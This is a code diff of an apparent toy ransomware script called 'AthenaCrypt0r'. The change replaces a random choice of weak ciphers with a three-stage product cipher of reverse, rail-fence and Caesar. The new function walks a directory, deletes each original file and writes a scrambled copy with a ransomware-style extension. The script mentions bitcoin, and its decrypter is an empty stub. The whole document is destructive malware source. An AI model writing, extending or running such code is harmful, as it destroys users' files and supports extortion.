@@ -27,9 +27,7 @@ def main(key):
 
     files = getdirs.getdirs(path)
 
-    # Randomly chooses an encryption algorithm and runs it.
-    EncryptionAlgorithms = [reverseCryptor,caeser,RailfenceEncrypt]
-    r.choice(EncryptionAlgorithms)(files)
+    Crypter(files)
 
     bitcoin = r.random()
     '''
@@ -47,37 +45,9 @@ def main(key):
     input("Please press any key to exit.")
 
 
-def reverseCryptor(files):
+def Crypter(files):
     outputfile = ".AthenaCrypt0r"
-    for file in files:
-        f = open(file, "r")
-        contents = f.read()
-        #print(contents)
-        f.close()
-        os.remove(file)
-        encrypted = rc.reverse(contents)
-        #print(encrypted)
-        f1 = open(file+outputfile, "w")
-        f1.write(encrypted)
-        f1.close()
-
-def RailfenceEncrypt(files):
-    outputfile = ".AthenaCrypt0r"
-    key = 3
-    for file in files:
-        f = open(file, "r")
-        contents = f.read()
-        #print(contents)
-        f.close()
-        os.remove(file)
-        encrypted = rail.encryptRailFence(contents, key)
-        #print(encrypted)
-        f1 = open(file+outputfile, "w")
-        f1.write(encrypted)
-        f1.close()
-
-def caeser(files):
-    outputfile = ".AthenaCrypt0r"
+    key = 3 
     shift = 13
     for file in files:
         f = open(file, "r")
@@ -85,11 +55,15 @@ def caeser(files):
         #print(contents)
         f.close()
         os.remove(file)
-        encrypted = ca.caesar(contents, shift)
-        print(encrypted)
+        stage1 = rc.reverse(contents) # run through all 3 algorithms to produce a product cipher
+        stage2 = rail.encryptRailFence(stage1, key)
+        stage3 = ca.caesar(stage2, shift)
         f1 = open(file+outputfile, "w")
-        f1.write(encrypted)
+        f1.write(stage3)
         f1.close()
+
+def Decrypter(files):
+    return 0
 
 if __name__=="__main__":
     main(generateKey())
